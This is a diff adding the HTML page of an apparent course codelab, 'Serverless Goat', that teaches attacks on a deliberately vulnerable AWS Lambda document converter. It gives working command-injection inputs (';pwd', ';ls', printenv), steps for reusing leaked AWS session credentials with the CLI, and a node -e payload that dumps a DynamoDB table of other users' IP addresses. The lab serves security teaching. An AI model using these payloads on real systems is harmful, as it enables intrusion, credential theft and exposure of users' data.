@@ -1,0 +1,204 @@
+
+<!doctype html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1,user-scalable=yes">
+<meta name="theme-color" content="#4F7DC9">
+<meta charset="UTF-8">
+<title>8.3: Serverless Goat</title>
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Source+Code+Pro:400|Roboto:400,300,400italic,500,700|Roboto+Mono">
+<link rel="stylesheet" href="//fonts.googleapis.com/icon?family=Material+Icons">
+<link rel="stylesheet" href="https://storage.googleapis.com/claat-public/codelab-elements.css">
+<style>
+.success{color:#1e8e3e}.error{color:red} </style>
+</head>
+<body>
+<google-codelab-analytics gaid="UA-49880327-14"></google-codelab-analytics>
+<google-codelab codelab-gaid="" id="W8.3_aws_serverlessgoat" title="8.3: Serverless Goat" environment="web" feedback-link="https://docs.google.com/document/d/1oRssROE86iWS-HjK8XnDcYt1wgW2Je8N7atoyTu8fDo">
+<google-codelab-step label="Introduction" duration="2">
+<p>Serverless applications do not have persistent machines at well-known addresses that an adversary can attack. Yet, this does not mean they are necessarily secure. Even serverless applications are subject to many of the attacks used in web applications running on servers such as sensitive information exposure, vulnerable components, and injection. </p>
+<h2 is-upgraded><strong>What you will</strong> do</h2>
+<p>In this codelab, you will visit a vulnerable serverless application and exploit it multiple ways. </p>
+<h2 class="checklist" is-upgraded><strong>What you&#39;ll learn</strong></h2>
+<ul class="checklist">
+<li>How to leverage vulnerabilities in serverless applications to gain unauthorized access to cloud resources</li>
+</ul>
+<h2 is-upgraded><strong>What you&#39;ll need</strong></h2>
+<ul>
+<li>An account on <a href="https://www.awseducate.com/" target="_blank">AWS</a></li>
+<li>A machine with the <a href="https://aws.amazon.com/cli/" target="_blank">AWS CLI</a> installed. </li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Vulnerable web application" duration="5">
+<h2 is-upgraded><strong>Visit the site</strong></h2>
+<p>The vulnerable application (courtesy of Yuri Shapira, Ory Segal, and <a href="https://www.puresec.io/" target="_blank">PureSec</a>) ​can be found at <a href="http://sg.oregonctf.org" target="_blank">http://sg.oregonctf.org</a> . The serverless application takes a URL that specifies a Word 97 document and converts it into HTML to return it. </p>
+<p class="image-container"><img style="width:609px" src="img/6fcf79b21bfabc73.png"></p>
+<h2 is-upgraded>Run the application</h2>
+<p>Submit the URL, the application redirects the user to a web frontend to an AWS S3 bucket where the result is stored. This is done since the application is implemented using AWS Lambda which has a file size limit on responses. Large files must be sent to an S3 bucket for subsequent retrieval.</p>
+<p class="image-container"><img style="width:531px" src="img/8e3eb6b96ce94215.png"></p>
+</google-codelab-step>
+<google-codelab-step label="Gather information" duration="5">
+<p>The URL <a href="http://sg.oregonctf.org" target="_blank">http://sg.oregonctf.org</a> redirects the user to a landing page of the application which exposes its front-end AWS Lambda endpoint. One would typically hide this particular endpoint behind a DNS name.</p>
+<ul>
+<li><strong>The endpoint exposes the region it is being run in. What region does it reside in?</strong></li>
+</ul>
+<p>There is another AWS Lambda endpoint that processes the URL submitted to perform the conversion. Right-clicking the &#34;Submit&#34; button and inspecting the HTML in the browser&#39;s Developer Tools exposes it.</p>
+<ul>
+<li><strong>What is the URL of the endpoint that handles the submission?</strong></li>
+</ul>
+<p>With the Developer Tools up, click on the &#34;Network&#34; tab to bring up browser requests and responses in real-time.</p>
+<p class="image-container"><img style="width:624px" src="img/18d357670ae0ac9f.png"></p>
+<p>You can pull out the HTTP request and response headers for the main conversion request, by clicking on it and then on &#34;Headers&#34;. Then, submit a document to be converted. The request should appear in Developer Tools. Clicking on it will give you the data that corresponds to this request including the General, Response Headers, Request Headers, and Query String Parameters.<br><img style="width:514.5px" src="img/cc17f0effaf4f49f.png"></p>
+<p>Expand out the General headers to see the HTTP status code that is returned on this request. Then, expand out the &#34;Response Headers&#34; to find the Location: HTTP response header that is associated with it.</p>
+<p>be sent along with this particular HTTP status code</p>
+<ul>
+<li><strong>What is the URL that the browser is redirected to?</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Test adversarial input" duration="5">
+<p>Input validation and sanitization must be done to ensure any application&#39;s security. Along with that, any errors that result from improper input should be sanitized, ensuring that no sensitive information is passed back. To test this, revisit the application and bring up Developer Tools. Upon performing the submission, examine the request that has been sent to the Lambda function to convert the document. The form submission employs the GET method for sending form parameters to the endpoint. Examine the parameter name. Now, remove the parameter name altogether, submit the request, and examine the output.<br><img style="width:168px" src="img/aa8f68030557baf0.png"><br>The omission of the form parameter results in an error that reveals the file path to the JavaScript file that implements the application. Make a note of this file path for the next step. The error also reveals a stack trace of where the application was during execution, starting from the leaf function where the error occurred and going back to the function that called the leaf. The error includes the line numbers in the JavaScript file where execution ended.</p>
+<ul>
+<li><strong>What leaf function did the error happen in? </strong></li>
+<li><strong>What function called this function?</strong></li>
+</ul>
+<p>Input validation is a key part of designing applications whether they are serverless or not. This particular application uses the AWS API Gateway to implement its functions. </p>
+<ul>
+<li><strong>Visit the AWS API Gateway </strong><a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-rest-api.html" target="_blank"><strong>Developer Guide</strong></a><strong> and examine the topics in the &#34;Develop&#34; section of &#34;Working with REST APIs&#34;. Find a feature that can be enabled to help this serverless application validate its input. </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Command injection" duration="10">
+<p>Injection attacks occur when input that is controlled by an adversary is sent directly to an interpreter running on the server without sanitization. In this application, a URL is sent to the application for the application to download and convert. If the URL is fed directly into a Unix command, then an adversary can inject an OS command into the</p>
+<p>processing by the use of a semicolon. For example &#34;<code>sleep 1; echo hi</code>&#34; performs a sleep followed by an echo.</p>
+<p>Use command injection within the web form to obtain the working directory the application is run in. Note that you can also perform the injection in the URL bar, but will need URL-encode the command (e.g. <code>;pwd</code> =&gt; <code>%3Bpwd</code>).</p>
+<ul>
+<li><strong>What is the working directory for the application?</strong></li>
+</ul>
+<p>Repeat the injection, but perform a listing of the directory (e.g. <code>;ls</code>)</p>
+<ul>
+<li><strong>What files are in this directory?</strong></li>
+</ul>
+<p>Then, repeat the injection, but <code>cat</code> the JavaScript file that implements the application (as discovered in the previous step) </p>
+<ul>
+<li><strong>Take a screenshot showing the raw output of the source file implementing the application.</strong></li>
+</ul>
+<p>Finally, the application is written in JavaScript and depends upon particular packages to be installed. From the directory listing, the package manifest in JSON is listed. Repeat the command injection to find the package included in the manifest and its version. </p>
+<ul>
+<li><strong>Look up this package and version to determine how old the package is? Find any known vulnerabilities in this package.</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Reverse-engineer the source" duration="10">
+<p>Examine the code to find the place where the application takes what is given as the <code>document_url</code> parameter, retrieves the URL it specifies (where the command injection occurs), then converts it. </p>
+<ul>
+<li><strong>Show the line of code that the command injection occurs in</strong></li>
+</ul>
+<p>After performing the conversion, the application creates a unique identifier, instantiates an AWS S3 client, and puts the object into a bucket. Finally, the application performs the redirection shown earlier. Answer the following questions about the code.</p>
+<ul>
+<li><strong>How is the name of the S3 bucket obtained by the application code?</strong></li>
+<li><strong>How is the URL obtained for the S3 bucket obtained for performing the redirection?</strong></li>
+<li><strong>What would be the impact of the vulnerability found earlier have in this code (if any)?</strong></li>
+</ul>
+<p>Examine the function that the error occurs in when <code>document_url</code> is missing in the URL parameters. The code takes the IP address of the request and the URL requested and logs it into a table in a database.</p>
+<ul>
+<li><strong>What database is being used to store information about requests?</strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Information exposure" duration="10">
+<p>In the previous step, the source code indicates that its configuration is pulled from the environment of the process that is running it. When we see the directory paths that are exposed when giving the script adversarial input, it appears that the function runs on a Linux-based system. Use the Linux command <code>printenv</code> to print the environment. Use command injection as done previously, to print the environment out.</p>
+<ul>
+<li><strong>Show the variable that stores the bucket name in a screenshot</strong></li>
+<li><strong>Show the table name that is used to store activity information from the application</strong></li>
+</ul>
+<p>Knowing the name of the bucket that is being used can often be leveraged to gain access. As an example, S3 buckets can be configured to allow public access via URL. In this case, the application has enabled this feature since it is redirecting users straight to a bucket-hosted URL. We can use the name of the bucket to see what kinds of information can be obtained. Buckets that have web-site hosting enabled in S3 can be accessed via a URL such as: <a href="https://s3.amazonaws.com" target="_blank"><code>https://</code>&lt;<code>BUCKET_NAME</code>&gt;<code>.s3.amazonaws.com/</code></a></p>
+<ul>
+<li><strong>Visit the URL associated with the S3 bucket and take a screenshot of what it reveals</strong></li>
+</ul>
+<p>Storage buckets implement object-based storage. Similar to web servers, knowing the key used to identify an object in a bucket, allows you to then access it. The manifest obtained above contains a list of all of the object keys stored in the bucket, including the times they were created and their size. Objects can be directly retrieved using a URL such as: <a href="https://s3.amazonaws.com" target="_blank"><code>https://</code>&lt;<code>BUCKET_NAME</code>&gt;<code>.s3.amazonaws.com/</code>&lt;<code>KEY</code>&gt;</a></p>
+<ul>
+<li><strong>Find a document that has been converted by another user previously and use its object key to get access to the converted data</strong></li>
+</ul>
+<p>As this example shows, anyone who knows the bucket name can see the output of other users&#39; converted documents. </p>
+</google-codelab-step>
+<google-codelab-step label="Expose and leverage credentials" duration="5">
+<p>Revisit the output of the environment variables. In examining it, you can see that it also includes the function&#39;s &#34;crown-jewels&#34;, its secret access key ID, its secret access key, and its session token. Knowing these values allows anyone to take on the roles the function has been given. If, for example, the function has been given write access to the storage bucket, we can directly use these values to write an arbitrary object into the bucket.</p>
+<p>Bring up AWS CLI so that it can be used to activate the credentials we&#39;ve discovered. </p>
+<ul>
+<li>To bootstrap the entry of the credentials, run &#34;<code>aws configure --profile serverlesshackme</code>&#34; to configure a profile using the captured credentials</li>
+<li>Fill out the information for the <code>AWS Access Key ID</code>, the <code>AWS Secret Access Key</code>, and the <code>Default region name</code> based on the AWS credentials that you&#39;ve revealed. Use &#34;<code>None</code>&#34; for the <code>Default output format</code>.</li>
+<li>The credentials obtained come with a session token. You need to manually add this token to the profile. To do so, there is a special file that the CLI uses to store the AWS account profile information you just entered: <code>$HOME/.aws/credentials</code></li>
+<li>Open this file up in an editor and find the profile, add a line to specify the AWS_SESSION_TOKEN via <code>aws_session_token</code> in profile as shown below. Ensure that there are no stray carriage returns especially on the session token</li>
+</ul>
+<pre>[serverlesshackme]
+aws_access_key_id = ASIA...5
+aws_secret_access_key = e58IY...El
+aws_session_token = AgoJb...7re0=</pre>
+<p>Go back to the AWS CLI and use the AWS Security Token Service to see the role associated with this access key and token. </p>
+<pre>aws sts get-caller-identity --profile serverlesshackme</pre>
+<ul>
+<li><strong>Take a screenshot of the output.</strong></li>
+<li><strong>Using the profile, show a screenshot of the objects in the S3 bucket that the function is using to store its results.</strong></li>
+</ul>
+<pre><code>aws s3 ls s3://&lt;bucket&gt; --profile serverlesshackme</code></pre>
+</google-codelab-step>
+<google-codelab-step label="Excess permissions" duration="5">
+<p>On cloud platforms, roles are defined with specific sets of permissions that determine the kinds of access to resources that are allowed. As shown in the previous step, we have taken on an assumed role that has been configured by the developer of the Lambda function. If the developer has not practiced least privileges in the allocation of permissions, we might be able to do operations that the developer might not have intended for us to do.</p>
+<p>In this case, you are blind to the permissions associated with the role you&#39;ve obtained. There are no IAM permissions given with it. However, given that the application is able to write to both an S3 storage bucket and a database, you can begin testing whether or not you have additional access beyond simply writing to each.</p>
+<h2 is-upgraded><strong>Role 1</strong></h2>
+<p>It turns out there are several roles attached to the Lambda you&#39;re accessing. As an adversary, you wouldn&#39;t typically have access to list them, but you would instead infer them by trial and error. The first role is the standard Lambda execution role that allows the Lambda to write to the CloudWatch service which serves as the project&#39;s centralized logging facility. Allowing a role to write to the log service is standard practice as allowing read access would enable it to access log entries of other services that it should not need.</p>
+<p class="image-container"><img style="width:359px" src="img/8d392208e7e27c02.png"></p>
+<h2 is-upgraded><strong>Role 2</strong></h2>
+<p>The next role is an in-line role to allow access to the database backend:</p>
+<p class="image-container"><img style="width:624px" src="img/e3c28ea7c87724fe.png"></p>
+<ul>
+<li><strong>Does the application ever need to read from the table specified?</strong></li>
+</ul>
+<p>Unlike The CloudWatch permission that only allows the Write, the fact that this role has been given read access to DynamoDB can lead to unauthorized exfiltration of any information contained within the database backend if the Lambda is compromised. </p>
+<h2 is-upgraded><strong>Role 3</strong></h2>
+<p>The last role specifies the access level to the storage bucket.</p>
+<p class="image-container"><img style="width:479px" src="img/c6553ecd839bc4d6.png"></p>
+<ul>
+<li><strong>What permissions might not be necessary in this policy? </strong></li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Data exfiltration" duration="10">
+<p><code>FunctionConvertRolePolicy0</code> has given read and write permissions to the backend database. Specifically, this gives the function the following permissions:</p>
+<pre>- dynamodb:GetItem
+- dynamodb:DeleteItem
+- dynamodb:PutItem
+- dynamodb:Scan
+- dynamodb:Query
+- dynamodb:UpdateItem
+- dynamodb:BatchWriteItem
+- dynamodb:BatchGetItem
+- dynamodb:DescribeTable</pre>
+<p>With these permissions and with the ability to inject commands into the Lambda, we can inject a script that exfiltrates the entire table of URLs converted and the IP addresses that these conversions have been submitted from. The code to inject is shown below. It performs a scan of the table used to store all of this information and dumps it out to the console.</p>
+<pre><code>const AWS = require(&#34;aws-sdk&#34;);
+(async () =&gt; {
+    console.log(
+        await new AWS.DynamoDB.DocumentClient().scan({
+            TableName: process.env.TABLE_NAME
+        }).promise());
+})();</code></pre>
+<p>We can then use command injection to invoke the Node.js interpreter on it. </p>
+<pre>https://; node -e &#39;const AWS = require(&#34;aws-sdk&#34;); (async () =&gt; {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME}).promise());})();&#39;</pre>
+<p>You will see a large number of conversions since this exposes all of the activity from each student in class. To modify the injection to only return yours, you can add a filter to this query. Substitute your IP address in the filter below to show only your accesses.</p>
+<pre>https://; node -e &#39;const AWS = require(&#34;aws-sdk&#34;); (async () =&gt; {console.log(await new AWS.DynamoDB.DocumentClient().scan({TableName: process.env.TABLE_NAME, ExpressionAttributeValues: {&#34;:ip&#34;: &#34;&lt;YourIPAddress&gt;&#34;}, FilterExpression: &#34;contains (ip, :ip)&#34;}).promise());})();&#39;</pre>
+<ul>
+<li><strong>Take a screenshot of a conversion and IP address from another user</strong>.</li>
+</ul>
+</google-codelab-step>
+<google-codelab-step label="Congratulations" duration="1">
+<p>You&#39;ve completed the AWS Serverless Goat lab.</p>
+<h2 class="checklist" is-upgraded><strong>What we&#39;ve covered</strong></h2>
+<ul class="checklist">
+<li>Serverless application security issues including failure to validate input, information exposure, command injection, excessive permissions, and data exfiltration.</li>
+<li>Leveraging vulnerabilities in serverless applications to gain unauthorized access.</li>
+</ul>
+</google-codelab-step>
+</google-codelab>
+<script src="https://storage.googleapis.com/claat-public/native-shim.js"></script>
+<script src="https://storage.googleapis.com/claat-public/custom-elements.min.js"></script>
+<script src="https://storage.googleapis.com/claat-public/prettify.js"></script>
+<script src="https://storage.googleapis.com/claat-public/codelab-elements.js"></script>
+<script src="//support.google.com/inapp/api.js"></script>
+</body>
+</html>
